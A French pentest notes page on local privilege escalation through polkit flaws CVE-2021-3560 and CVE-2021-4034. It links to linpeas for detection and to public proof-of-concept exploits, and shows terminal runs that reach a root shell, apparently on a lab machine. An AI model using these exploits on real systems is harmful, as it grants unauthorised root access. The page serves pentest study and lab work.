# PE : polkit

## CVE-2021-3560

Vulnérabilité permettant à un attaquant d'élever ses privilèges localement sur de multiples distributions, même les plus récentes.

Cette vulnérabilité est détectable avec la version du 6/2/2022 de `linpeas` : [https://github.com/carlospolop/PEASS-ng/releases/download/20220206/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/download/20220206/linpeas.sh)

Cette vulnérabilité est exploitable avec le PoC suivant : [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)

Comme indiqué dans l'explication du PoC, il peut-être nécessaire de relancer de multiple fois celui-ci car la vulnérabilité repose sur un _timing_ précis.

### Exemple

```
[dwight@paper ~]$ ./poc.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using sudo - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$ su - secnigma
Password: 
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 
[root@paper secnigma]# id
uid=0(root) gid=0(root) groups=0(root)
[root@paper secnigma]# 
```

### Source

[https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)

## CVE-2021-4034

Vulnérabilité permettant à un attaquant d'élever ses privilèges localement sur de multiples distributions, même les plus récentes.

Cette vulnérabilité est détectable avec la version du 9/2/2022 de `linpeas` : [https://github.com/carlospolop/PEASS-ng/releases/download/20220209/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/download/20220209/linpeas.sh)

Cette vulnérabilité est exploitable avec le PoC suivant : [https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)

### Exemple

```
# gcc poc-pwnkit.c -o poc-pwnkit                                               
# id  
uid=1000(alan) gid=1000(alan) groupes=1000(alan),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),132(scanner),142(kaboxer)               
# ./poc-pwnkit 
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),132(scanner),142(kaboxer),1000(alan)
```
